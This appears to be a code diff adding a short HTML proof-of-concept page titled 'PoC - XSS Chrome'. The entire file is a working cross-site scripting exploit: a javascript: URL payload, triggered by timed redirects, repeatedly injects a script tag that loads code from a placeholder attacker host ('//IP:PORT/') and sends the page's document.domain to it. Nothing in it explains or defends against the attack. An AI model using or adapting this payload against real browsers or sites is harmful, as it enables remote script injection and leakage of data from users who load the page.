@@ -1,0 +1,13 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>PoC - XSS Chrome</title>
+
+<script>
+    var payload = 'javascript:setInterval(function(){with(document)body.appendChild(createElement("script")).src="//IP:PORT/?".concat(document.domain)},1010)';
+    setTimeout(function() {
+     window.location.href = payload;
+     }, 1000);
+
+     setTimeout (function() {location.href = payload; }, 5); 
+
+ </script>
